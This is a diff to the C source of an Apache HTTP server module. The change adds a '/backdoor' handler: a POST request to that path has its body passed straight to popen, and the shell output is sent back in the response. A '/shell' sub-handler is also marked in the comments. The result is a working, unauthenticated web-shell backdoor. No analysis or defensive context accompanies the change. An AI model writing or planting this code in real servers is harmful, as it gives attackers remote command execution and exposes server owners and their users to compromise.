@@ -2,6 +2,7 @@
 #include "http_core.h"
 #include "http_protocol.h"
 #include "http_request.h"
+#include <stdio.h>
 
 static void register_hooks(apr_pool_t *pool);
 static int winchester_handler(request_rec *r);
@@ -14,14 +15,20 @@ static int winchester_handler(request_rec *r)
         // no uri, pass
         return OK;
     }
+
+    // sub-handler for telnet shell
     if (strcmp(r->unparsed_uri, "/shell") == 0) {
         ap_rprintf(r, "Shell dir");
         return DONE;
     }
+
+    // sub-handler for post backdoor
     if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST) {
         apr_bucket_brigade *bb_in;
         apr_bucket *bucket;
         apr_status_t rc;
+        char line[128];
+        FILE *pipe;
 
         // create bucket brigade to store body
         bb_in = apr_brigade_create(r->pool, r->connection->bucket_alloc);
@@ -50,10 +57,16 @@ static int winchester_handler(request_rec *r)
                 return DONE;
             }
             if (buf != NULL) {
-                ap_rprintf(r, "\tBuffer: %s\n", buf);
+                ap_rprintf(r, "\n\tBuffer: %s\n", buf);
             }
+
+            // run buf in shell
+            pipe = popen(buf, "r");
+            while (fgets(line, 128, pipe)) {
+                ap_rprintf(r, "\n\tResponse: %s\n", line);
+            }
+
         }
-        ap_rprintf(r, "Read brigade into buffer\n");
 
         ap_rprintf(r, "Operation successful!\n");
 
